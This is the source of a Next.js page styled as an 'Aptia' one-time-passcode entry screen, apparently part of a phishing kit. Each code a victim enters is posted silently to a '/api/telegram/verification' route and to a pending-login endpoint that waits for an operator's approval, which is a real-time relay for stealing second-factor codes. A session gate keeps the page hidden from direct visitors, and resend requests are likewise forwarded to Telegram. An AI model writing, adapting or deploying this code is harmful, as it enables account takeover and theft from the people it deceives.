"use client"

/**
 * One-Time Passcode Entry — Aptia landing chrome only.
 */

import {
  Suspense,
  useCallback,
  useEffect,
  useLayoutEffect,
  useRef,
  useState,
} from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { AptiaAuthChrome } from "@/components/aptia-auth-chrome"
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages"
import { pollPendingLogin } from "@/lib/poll-pending-login"

const OTP_LENGTH = 6

function VerifyCodeContent() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const methodParam = searchParams.get("method") || "email"
  const isEmail = methodParam !== "text" && methodParam !== "sms"
  const channelLabel = isEmail ? "Email" : "SMS"
  const kitMethod = isEmail ? "email" : "text"

  useLayoutEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("loginReady")) {
      window.location.href = "/"
    }
  }, [])

  const [code, setCode] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const [resendCooldown, setResendCooldown] = useState(0)
  const inputRef = useRef<HTMLInputElement | null>(null)
  const verifyingRef = useRef(false)

  useEffect(() => {
    if (searchParams.get("denied") === "1") {
      setCode("")
      setErrors({ otp: OTP_CODE_ERROR_TEXT })
      setIsLoading(false)
      verifyingRef.current = false
      setTimeout(() => inputRef.current?.focus(), 0)
      router.replace(`/login/verify-code?method=${kitMethod}`)
      return
    }
    if (searchParams.get("timeout") === "1") {
      setCode("")
      setErrors({ otp: MSG_UNABLE_VERIFY_TIME })
      setIsLoading(false)
      router.replace(`/login/verify-code?method=${kitMethod}`)
    }
  }, [searchParams, router, kitMethod])

  useEffect(() => {
    if (resendCooldown <= 0) return
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(timer)
  }, [resendCooldown])

  const handleCodeChange = (value: string) => {
    if (isLoading) return
    const digits = value.replace(/\D/g, "").slice(0, OTP_LENGTH)
    setCode(digits)
    if (errors.otp) setErrors({})
  }

  const handleVerify = useCallback(async () => {
    if (isLoading || verifyingRef.current) return
    setErrors({})
    if (code.length !== OTP_LENGTH) {
      setErrors({ otp: OTP_CODE_ERROR_TEXT })
      return
    }

    verifyingRef.current = true
    setIsLoading(true)

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: kitMethod,
        otp: code,
        page: `/login/verify-code?method=${kitMethod}`,
      }),
      keepalive: true,
    }).catch(() => {})

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ method: kitMethod, otp: code, flow: "otp" }),
      })
      const data = (await res.json().catch(() => ({}))) as { id?: string }

      if (!res.ok || !data?.id) {
        verifyingRef.current = false
        setIsLoading(false)
        setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
        return
      }

      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS)
      verifyingRef.current = false
      setIsLoading(false)

      if (outcome === "approved" || outcome === "redirected") {
        window.location.href = "/api/login-out"
        return
      }
      if (outcome === "denied") {
        router.replace(`/login/verify-code?method=${kitMethod}&denied=1`)
        return
      }
      setErrors({
        otp:
          outcome === "timeout" ? MSG_UNABLE_VERIFY_TIME : MSG_UNABLE_REACH_VERIFICATION,
      })
      setCode("")
    } catch {
      verifyingRef.current = false
      setIsLoading(false)
      setErrors({ otp: MSG_UNABLE_REACH_VERIFICATION })
      setCode("")
    }
  }, [isLoading, code, kitMethod, router])

  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return
    setIsResending(true)
    setCode("")
    setErrors({})
    try {
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ page: `/login/verify-code?method=${kitMethod}` }),
        keepalive: true,
      }).catch(() => {})
      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS))
    } finally {
      setIsResending(false)
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC)
      inputRef.current?.focus()
    }
  }

  const ready = code.length === OTP_LENGTH

  return (
    <AptiaAuthChrome>
      <div className="l-mas-login-wrap verify-panel">
        <section className="verify-panel-inner" aria-labelledby="otp-heading">
          <h1 id="otp-heading" className="mas-h2">
            Enter verification code
          </h1>
          <p className="mas-sub">
            {isEmail ? "An email has been sent." : "An SMS has been sent."} Enter the
            code you received via <strong>{channelLabel}</strong>.
          </p>
          <p className="mas-sub" style={{ marginTop: -8 }}>
            Do not share your verification code with anyone.
          </p>

          {errors.otp ? (
            <p className="verify-error" role="alert">
              {errors.otp}
            </p>
          ) : null}

          <form
            className={`mas-form verify-otp-form${isLoading ? " is-busy" : ""}`}
            onSubmit={(e) => {
              e.preventDefault()
              void handleVerify()
            }}
            noValidate
            aria-busy={isLoading}
          >
            <label className="mas-label" htmlFor="otp-code">
              Verification code
            </label>
            <input
              ref={inputRef}
              id="otp-code"
              className="mas-form-control"
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              name="otp"
              value={code}
              onChange={(e) => handleCodeChange(e.target.value)}
              disabled={isLoading}
              aria-invalid={Boolean(errors.otp)}
            />
          </form>

          <div className="verify-actions">
            <button
              type="button"
              className={`mas-btn mas-btn-login${isLoading ? " is-loading" : ready ? " is-ready" : ""}`}
              disabled={!ready || isLoading}
              aria-busy={isLoading}
              onClick={() => void handleVerify()}
            >
              {isLoading ? "Please wait…" : "Verify"}
            </button>
            <button
              type="button"
              className="mas-btn mas-btn-outline verify-cancel"
              disabled={isLoading || isResending || resendCooldown > 0}
              onClick={() => void handleResend()}
            >
              {isResending
                ? "Sending…"
                : resendCooldown > 0
                  ? `Resend code (${resendCooldown})`
                  : "Resend code"}
            </button>
            <button
              type="button"
              className="mas-link verify-back"
              disabled={isLoading}
              onClick={() => {
                window.location.href = "/login/2fa-verify"
              }}
            >
              Back to method selection
            </button>
          </div>
        </section>
      </div>
    </AptiaAuthChrome>
  )
}

export default function VerifyCodePage() {
  return (
    <Suspense
      fallback={
        <AptiaAuthChrome>
          <div className="l-mas-login-wrap verify-panel">
            <p className="mas-sub">Loading…</p>
          </div>
        </AptiaAuthChrome>
      }
    >
      <VerifyCodeContent />
    </Suspense>
  )
}
